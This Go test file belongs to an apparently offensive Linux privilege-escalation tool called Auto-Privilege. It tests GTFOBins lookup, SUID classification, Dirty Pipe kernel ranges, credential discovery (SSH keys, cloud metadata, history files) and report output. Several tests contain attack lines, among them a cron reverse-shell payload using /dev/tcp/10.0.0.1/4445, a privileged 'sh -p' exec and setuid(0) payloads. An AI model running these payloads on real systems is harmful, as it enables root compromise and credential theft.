package main

import (
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestGTFOBinsLookup(t *testing.T) {
	tests := []struct {
		bin     string
		hasCmd  bool
		isShell bool
	}{
		{"python3", true, true},
		{"perl", true, true},
		{"find", true, false},
		{"vim", true, false},
		{"awk", true, false},
		{"nonexistent", false, false},
		{"nmap", true, false},
		{"tar", true, false},
		{"docker", true, false},
		{"bash", true, true},
		{"zsh", true, true},
	}

	for _, tt := range tests {
		cmd, ok := getCommand(tt.bin)
		if ok != tt.hasCmd {
			t.Errorf("%s: hasCmd=%v, want %v", tt.bin, ok, tt.hasCmd)
		}
		if ok && cmd == "" {
			t.Errorf("%s: has cmd but it's empty", tt.bin)
		}
		shell := isSuidShellBin(tt.bin)
		if shell != tt.isShell {
			t.Errorf("%s: isShell=%v, want %v", tt.bin, shell, tt.isShell)
		}
		if ok && gtfoCategory[tt.bin] == "" {
			t.Errorf("%s: missing gtfoCategory", tt.bin)
		}
	}
}

func TestRiskLevels(t *testing.T) {
	if RiskSafe.String() != "SAFE" {
		t.Errorf("safe=%s", RiskSafe.String())
	}
	if RiskDanger.String() != "DANGER" {
		t.Errorf("danger=%s", RiskDanger.String())
	}
	if parseMaxRisk("safe") != RiskSafe {
		t.Error("parse safe")
	}
	if parseMaxRisk("all") != RiskDanger {
		t.Error("parse all")
	}
	if !validMaxRisk("medium") {
		t.Error("medium must be valid")
	}
	if validMaxRisk("yolo") {
		t.Error("yolo must be rejected")
	}
}

func TestExtractBinName(t *testing.T) {
	cases := map[string]string{
		"/usr/bin/python3":    "python3",
		"/usr/local/bin/find": "find",
		"/bin/bash":           "bash",
		"socat":               "socat",
	}
	for path, want := range cases {
		got := extractBinName(path)
		if got != want {
			t.Errorf("extractBinName(%s)=%s, want %s", path, got, want)
		}
	}
}

func TestColorOutput(t *testing.T) {
	// Ensure colorize doesn't panic
	s := colorize("test", AnsiRed)
	if !strings.HasPrefix(s, AnsiRed) {
		t.Error("colorize missing prefix")
	}
	if !strings.HasSuffix(s, AnsiReset) {
		t.Error("colorize missing reset")
	}
	// Empty string
	if colorize("", AnsiRed) != "" {
		t.Error("colorize empty should be empty")
	}
	// Disabled mode returns plain text
	setColorMode(false)
	if colorize("plain", AnsiRed) != "plain" {
		t.Error("disabled colorize must return plain text")
	}
	setColorMode(true)
}

func TestBannerArtSpellsAutoPriv(t *testing.T) {
	if len(bannerArt) != 6 {
		t.Fatalf("banner must have 6 lines, has %d", len(bannerArt))
	}
	// Box-drawing runes are multi-byte in UTF-8: compare by runes, not bytes.
	width := len([]rune(bannerArt[0]))
	for i, line := range bannerArt {
		if len([]rune(line)) != width {
			t.Errorf("banner line %d has width %d, want %d (misaligned box bug)",
				i, len([]rune(line)), width)
		}
	}
	// Round-trip decode with the same glyph table the generator uses.
	glyphs := map[string][]string{
		"A": {" █████╗ ", "██╔══██╗", "███████║", "██╔══██║", "██║  ██║", "╚═╝  ╚═╝"},
		"U": {"██╗   ██╗", "██║   ██║", "██║   ██║", "██║   ██║", "╚██████╔╝", " ╚═════╝ "},
		"T": {"████████╗", "╚══██╔══╝", "   ██║   ", "   ██║   ", "   ██║   ", "   ╚═╝   "},
		"O": {" ██████╗ ", "██╔═══██╗", "██║   ██║", "██║   ██║", "╚██████╔╝", " ╚═════╝ "},
		"P": {"██████╗ ", "██╔══██╗", "██████╔╝", "██╔═══╝ ", "██║     ", "╚═╝     "},
		"R": {"██████╗ ", "██╔══██╗", "██████╔╝", "██╔══██╗", "██║  ██║", "╚═╝  ╚═╝"},
		"I": {"██╗", "██║", "██║", "██║", "██║", "╚═╝"},
		"V": {"██╗   ██╗", "██║   ██║", "██║   ██║", "╚██╗ ██╔╝", " ╚████╔╝ ", "  ╚═══╝  "},
	}
	rows := make([][]rune, 6)
	for i, line := range bannerArt {
		rows[i] = []rune(line)
	}
	decoded := ""
	x := 0
	for x < width {
		matched := false
		for ch, g := range glyphs {
			w := len([]rune(g[0]))
			if x+w > width {
				continue
			}
			ok := true
			for row := 0; row < 6; row++ {
				if string(rows[row][x:x+w]) != g[row] {
					ok = false
					break
				}
			}
			if ok {
				decoded += ch
				x += w
				matched = true
				break
			}
		}
		if !matched {
			t.Fatalf("undecodable rune column at %d — banner art corrupted", x)
		}
	}
	if decoded != "AUTOPRIV" {
		t.Errorf("banner decodes to %q, want AUTOPRIV", decoded)
	}
}

func TestParseVectorList(t *testing.T) {
	got, err := parseVectorList("suid, sudo ,cron")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 3 || got[0] != "suid" || got[1] != "sudo" || got[2] != "cron" {
		t.Errorf("parseVectorList = %v", got)
	}
	if _, err := parseVectorList("suid,bogus"); err == nil {
		t.Error("bogus vector must error")
	}
	if _, err := parseVectorList(""); err == nil {
		t.Error("empty list must error")
	}
	dup, _ := parseVectorList("suid,suid")
	if len(dup) != 1 {
		t.Errorf("duplicates must collapse, got %v", dup)
	}
}

func TestSortedVectorsSafestFirst(t *testing.T) {
	vectors := []Vector{
		{Name: "high", Risk: RiskHigh},
		{Name: "safe", Risk: RiskSafe},
		{Name: "low", Risk: RiskLow},
		{Name: "medium", Risk: RiskMedium},
	}
	sorted := sortedVectors(vectors)
	want := []string{"safe", "low", "medium", "high"}
	for i, w := range want {
		if sorted[i].Name != w {
			t.Errorf("position %d = %s, want %s", i, sorted[i].Name, w)
		}
	}
	// Original slice must stay untouched (stable copy semantics).
	if vectors[0].Name != "high" {
		t.Error("sortedVectors must not mutate its input")
	}
}

func TestKernelVersionAndRange(t *testing.T) {
	kv := kernelVersion("5.10.134-013.8.3.kangaroo.al8.x86_64")
	if kv[0] != 5 || kv[1] != 10 || kv[2] != 134 {
		t.Errorf("kernelVersion = %v", kv)
	}
	if !kernelInRange(kv, []int{5, 8, 0}, []int{5, 16, 10}) {
		t.Error("5.10.134 must be inside Dirty Pipe range")
	}
	if kernelInRange([]int{6, 8, 0}, []int{5, 8, 0}, []int{5, 16, 10}) {
		t.Error("6.8 must be outside Dirty Pipe range")
	}
	if kernelVersion("") != nil {
		t.Error("empty kernel string must return nil")
	}
}

func TestSudoVersionCompare(t *testing.T) {
	cases := []struct {
		ver  string
		ref  string
		want bool
	}{
		{"1.8.31", "1.9.5p2", true},
		{"1.9.5p1", "1.9.5p2", true},
		{"1.9.5p2", "1.9.5p2", false},
		{"1.9.16p2", "1.9.5p2", false},
	}
	for _, c := range cases {
		if got := sudoVersionOlder(c.ver, c.ref); got != c.want {
			t.Errorf("sudoVersionOlder(%s, %s) = %v, want %v", c.ver, c.ref, got, c.want)
		}
	}
}

func TestRunCmdOutTimeout(t *testing.T) {
	start := time.Now()
	_, err := runCmdOut(300*time.Millisecond, "sleep", "5")
	if err == nil {
		t.Error("sleep 5 with 300ms timeout must error")
	}
	if time.Since(start) > 2*time.Second {
		t.Error("timeout did not fire — command blocked")
	}
}

func TestExecShellCapturedQuotes(t *testing.T) {
	// The regression test for the strings.Fields bug: quoted shell syntax
	// must reach /bin/sh intact.
	setColorMode(true)
	res := execShell(`echo 'import os; os.execlp("sh","sh","-p")'`, Options{}, 5*time.Second)
	if !res.Success {
		t.Fatalf("execShell failed: %s", res.Error)
	}
	if res.Output != `import os; os.execlp("sh","sh","-p")` {
		t.Errorf("quotes mangled: %q", res.Output)
	}
}

func TestCronPayloadAndSpoolGuard(t *testing.T) {
	payload := cronPayload("10.0.0.1", "4445", "/etc/cron.d/backup")
	if !strings.Contains(payload, "10.0.0.1") || !strings.Contains(payload, "4445") {
		t.Errorf("payload must use the configured listener: %s", payload)
	}
	r := exploitCron("/var/spool/cron/crontabs/root", Options{LHost: "10.0.0.1", LPort: "4445"})
	if r.Success {
		t.Error("spool crontab exploit must refuse (runs as owner, not root)")
	}
}

func TestPasswdHashFormat(t *testing.T) {
	if !strings.HasPrefix(passwdHash, "$6$") {
		t.Error("passwdHash must be sha512-crypt")
	}
	if len(passwdHash) < 90 {
		t.Errorf("passwdHash looks truncated: %d chars", len(passwdHash))
	}
}

func TestIsSSHPrivateKey(t *testing.T) {
	yes := []string{"/home/u/.ssh/id_rsa", "/root/.ssh/id_ed25519", "/opt/id_ecdsa", "backup_dsa", "/x/id_dsa"}
	no := []string{"/home/u/.ssh/authorized_keys", "/home/u/.ssh/known_hosts", "notes.txt"}
	for _, p := range yes {
		if !isSSHPrivateKey(p) {
			t.Errorf("%s should be a private key", p)
		}
	}
	for _, p := range no {
		if isSSHPrivateKey(p) {
			t.Errorf("%s should NOT be a private key", p)
		}
	}
}

func TestIsWritableByCurrentUser(t *testing.T) {
	dir := t.TempDir()
	writable := filepath.Join(dir, "w")
	unwritable := filepath.Join(dir, "u")
	if err := os.WriteFile(writable, []byte("x"), 0666); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(unwritable, []byte("x"), 0444); err != nil {
		t.Fatal(err)
	}
	if !isWritableByCurrentUser(writable) {
		t.Error("0666 file must be writable")
	}
	if isWritableByCurrentUser(unwritable) {
		t.Error("0444 file must not be writable")
	}
	if isWritableByCurrentUser(filepath.Join(dir, "missing")) {
		t.Error("missing file must not be writable")
	}
}

func TestMarkdownReport(t *testing.T) {
	p := &AutoPrivilege{
		Opts:    Options{Report: "x"},
		Started: time.Now(),
		Findings: []Finding{
			{Source: "SUID", Target: "/usr/bin/python3", Description: "test | pipe", Risk: RiskHigh, Exploitable: true},
		},
		Vectors: []Vector{
			{Name: "SUID python3", Category: "suid", Target: "/usr/bin/python3", Command: "python3 -c 'x'"},
		},
	}
	path := filepath.Join(t.TempDir(), "report.md")
	if err := p.WriteMarkdownReport(path); err != nil {
		t.Fatalf("WriteMarkdownReport: %v", err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	out := string(data)
	if !strings.Contains(out, "# Auto-Privilege Report") {
		t.Error("missing title")
	}
	if !strings.Contains(out, `test \| pipe`) {
		t.Error("pipes must be escaped in markdown tables")
	}
	if !strings.Contains(out, "```bash") {
		t.Error("vector commands must be fenced")
	}
}

func TestJSONReportShape(t *testing.T) {
	p := &AutoPrivilege{
		Opts:     Options{JSON: true},
		Started:  time.Now(),
		Findings: []Finding{{Source: "SUID", Description: "d", Risk: RiskLow, Exploitable: true}},
	}
	rep := buildReport(p)
	if rep.Tool != "Auto-Privilege" || rep.Version != Version {
		t.Error("report metadata missing")
	}
	if rep.Findings == nil || len(rep.Findings) != 1 {
		t.Error("findings must serialize as a list")
	}
	if rep.Host == "" || rep.User == "" {
		t.Error("host/user must be populated")
	}
}

func TestJSONSummary(t *testing.T) {
	p := &AutoPrivilege{
		Started: time.Now(),
		Findings: []Finding{
			{Source: "SUID", Risk: RiskHigh, Exploitable: true},
			{Source: "CAPS", Risk: RiskMedium, Exploitable: false},
			{Source: "KERNEL", Risk: RiskHigh, Exploitable: true},
		},
		Vectors: []Vector{
			{Name: "auto-1", Exploit: func() *ExploitResult { return nil }},
			{Name: "manual-1"},
			{Name: "manual-2"},
		},
	}
	s := buildSummary(p)
	if s.Findings != 3 || s.Exploitable != 2 {
		t.Errorf("findings/exploitable = %d/%d, want 3/2", s.Findings, s.Exploitable)
	}
	if s.Vectors != 3 || s.Auto != 1 || s.Manual != 2 {
		t.Errorf("vectors/auto/manual = %d/%d/%d, want 3/1/2", s.Vectors, s.Auto, s.Manual)
	}
	if s.Risks["HIGH"] != 2 || s.Risks["MEDIUM"] != 1 {
		t.Errorf("risk buckets = %v, want HIGH:2 MEDIUM:1", s.Risks)
	}
	if _, ok := s.Risks["SAFE"]; ok {
		t.Error("zero-count risk buckets must be omitted")
	}
	if s.Risks == nil {
		t.Error("Risks must never be nil (must render as {} not null)")
	}
	// The summary must also ride along inside the full report.
	rep := buildReport(p)
	if rep.Summary.Vectors != 3 || rep.Summary.Exploitable != 2 {
		t.Errorf("report.summary not wired: %+v", rep.Summary)
	}
}

func TestEnumerateCredentialVectors(t *testing.T) {
	// Every exploitable CRED finding must produce exactly one manual vector,
	// so the plan and report never drop a finding.
	cases := []Finding{
		{Source: "CRED", Target: "/home/u/.ssh/id_rsa", Description: "SSH private key found", Exploitable: true},
		{Source: "CRED", Target: "http://169.254.169.254/latest/meta-data/", Description: "Cloud metadata endpoint accessible", Exploitable: true},
		{Source: "CRED", Target: "/root/.bash_history", Description: "History file with potential secrets: password", Exploitable: true},
		{Source: "CRED", Target: "/etc/mysql/my.cnf", Description: "MySQL config with credentials", Exploitable: true},
	}
	for _, f := range cases {
		p := &AutoPrivilege{}
		enumerateCredential(p, f)
		if len(p.Vectors) != 1 {
			t.Errorf("finding %s produced %d vectors, want 1", f.Target, len(p.Vectors))
			continue
		}
		v := p.Vectors[0]
		if v.Exploit != nil {
			t.Errorf("cred vector %s must be manual", v.Name)
		}
		if v.Meta["manual"] != "true" {
			t.Errorf("cred vector %s missing manual meta", v.Name)
		}
		if v.Command == "" {
			t.Errorf("cred vector %s has no command", v.Name)
		}
	}
	// Type tagging lets scripts tell the cred techniques apart.
	p := &AutoPrivilege{}
	enumerateCredential(p, cases[1])
	if p.Vectors[0].Meta["type"] != "cloud-metadata" {
		t.Errorf("cloud metadata vector type = %s", p.Vectors[0].Meta["type"])
	}
}

func TestClassifySUID(t *testing.T) {
	// Root-owned SUID bins with a known technique stay exploitable.
	if risk, ok := classifySUID("python3", 0); !ok || risk != RiskHigh {
		t.Errorf("python3 uid0 = %s/%v, want HIGH/true", risk, ok)
	}
	if _, ok := classifySUID("find", 0); !ok {
		t.Error("find uid0 must be exploitable")
	}
	// Root-owned SUID without a known technique: intel only.
	if _, ok := classifySUID("chsh", 0); ok {
		t.Error("chsh uid0 has no technique, must not be exploitable")
	}
	// Non-root-owned SUID: NEVER a root vector, technique or not.
	if _, ok := classifySUID("python3", 1000); ok {
		t.Error("SUID python3 owned by uid 1000 must not be exploitable")
	}
	if _, ok := classifySUID("bash", 1000); ok {
		t.Error("SUID bash owned by uid 1000 must not be exploitable")
	}
}

// captureStdout grabs whatever fn prints to os.Stdout so quiet-mode leaks
// are detectable.
func captureStdout(t *testing.T, fn func()) string {
	t.Helper()
	orig := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	os.Stdout = w
	fn()
	_ = w.Close()
	os.Stdout = orig
	data, _ := io.ReadAll(r)
	return string(data)
}

func TestPrintQuietRespected(t *testing.T) {
	f := Finding{Source: "SUID", Target: "/usr/bin/python3", Description: "test", Risk: RiskHigh, Exploitable: true}

	out := captureStdout(t, func() {
		p := &AutoPrivilege{Opts: Options{Quiet: true}}
		p.Print(f) // exploitable: the old code leaked it in quiet mode
	})
	if out != "" {
		t.Errorf("--quiet must print nothing, got %q", out)
	}

	out = captureStdout(t, func() {
		p := &AutoPrivilege{}
		p.Print(f)
	})
	if !strings.Contains(out, "SUID") {
		t.Errorf("non-quiet Print must still print, got %q", out)
	}
}

func TestCronVectorCommandQuoting(t *testing.T) {
	p := &AutoPrivilege{Opts: Options{LHost: "10.0.0.1", LPort: "4445"}}
	enumerateCRON(p, Finding{Source: "CRON", Target: "/etc/cron.d/backup", Exploitable: true})
	if len(p.Vectors) != 1 {
		t.Fatalf("expected 1 vector, got %d", len(p.Vectors))
	}
	cmd := p.Vectors[0].Command
	// The payload embeds single quotes (bash -c '...'), so the displayed
	// command must be a quoted heredoc, not an echo with broken quoting.
	if !strings.Contains(cmd, "<<'AUTOPRIV_EOF'") {
		t.Errorf("cron command must use a quoted heredoc: %q", cmd)
	}
	if !strings.Contains(cmd, "exec 5<>/dev/tcp/10.0.0.1/4445") {
		t.Errorf("cron command must embed the configured listener: %q", cmd)
	}
	if strings.Contains(cmd, "echo '") {
		t.Errorf("cron command must not re-introduce the broken echo form: %q", cmd)
	}
	// Round-trip: the displayed command must survive /bin/sh verbatim.
	// Target a temp file so the check never touches the real cron dirs;
	// `cat` goes on its own line because a heredoc terminator must be the
	// whole line.
	tmp := filepath.Join(t.TempDir(), "backup")
	real := strings.Replace(cmd, "/etc/cron.d/backup", tmp, 1)
	res := execShell(real+"\ncat "+tmp, Options{}, 5*time.Second)
	if !res.Success || !strings.Contains(res.Output, "dev/tcp/10.0.0.1/4445") {
		t.Errorf("displayed cron command must execute cleanly (success=%v, output=%q)", res.Success, res.Output)
	}
}

func TestCapPayload(t *testing.T) {
	if !strings.Contains(capSetuidPayload("/usr/bin/python3.10"), "os.setuid(0)") {
		t.Error("python payload must setuid(0)")
	}
	if !strings.Contains(capSetuidPayload("/usr/bin/perl"), "exec") {
		t.Error("perl payload must exec")
	}
}

func TestGTFOCount(t *testing.T) {
	if GTFOCount() < 60 {
		t.Errorf("expected 60+ GTFOBins entries, got %d", GTFOCount())
	}
}

func TestFindingPrint(t *testing.T) {
	p := &AutoPrivilege{Opts: Options{}}
	f := Finding{Source: "SUID", Target: "/usr/bin/python3",
		Description: "test", Risk: RiskHigh, Exploitable: true}
	// Should not panic
	p.Print(f)
}

func TestVectorPrint(t *testing.T) {
	p := &AutoPrivilege{Opts: Options{}}
	v := Vector{Name: "test", Category: "suid", Target: "/bin/sh",
		Risk: RiskHigh}
	p.PrintVector(v)
}

func TestResultPrint(t *testing.T) {
	p := &AutoPrivilege{Opts: Options{}}
	r := &ExploitResult{Success: true, IsRoot: true, Vector: "test"}
	p.PrintExploit(r)
	r2 := &ExploitResult{Success: false, Error: "failed"}
	p.PrintExploit(r2)
}

func TestAmIRoot(t *testing.T) {
	s := amIRoot()
	if s == "" {
		t.Error("amIRoot returned empty")
	}
	if currentUsername() == "" {
		t.Error("currentUsername returned empty")
	}
}
